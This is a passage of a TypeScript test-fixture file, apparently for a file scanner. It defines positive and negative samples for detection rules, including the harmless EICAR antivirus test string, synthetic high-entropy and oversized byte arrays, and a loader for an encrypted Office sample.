    positive: { bytes: enc("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"), name: "eicar.com" },
    negative: { bytes: enc("X5O!P%@AP not eicar"), name: "nope.com" },
  },
  BASE64_BLOB: {
    positive: { bytes: enc("A".repeat(40_000)), name: "b64.txt" },
    negative: { bytes: enc("short text"), name: "ok.txt" },
  },
  HIGH_ENTROPY: {
    positive: { bytes: (() => { const b = new Uint8Array(4096); for (let i = 0; i < b.length; i++) b[i] = (i * 17 + 31) & 0xff; return b; })(), name: "rand.bin" },
    negative: { bytes: new Uint8Array(4096), name: "zeros.bin" },
  },
  SCAN_LIMIT: {
    positive: { bytes: enc("A".repeat(10_000)), name: "big.txt", options: { limits: { maxBytes: 100 } } },
    negative: { bytes: enc("A".repeat(50)), name: "ok.txt", options: { limits: { maxBytes: 100 } } },
  },
  SCAN_ERROR: {
    positive: { bytes: enc("placeholder"), name: "err.bin" },
    negative: { bytes: enc("hello"), name: "ok.txt" },
  },
};

/** Replace placeholders that need generated CFB encryption / SCAN_ERROR injection notes. */
export function hydrateRuleFixtures(): void {
  RULE_FIXTURES.OFFICE_ENCRYPTED!.positive = {
    bytes: new Uint8Array(readFileSync(join(disk, "office-encrypted.bin"))),
    name: "enc.docx",
  };
}
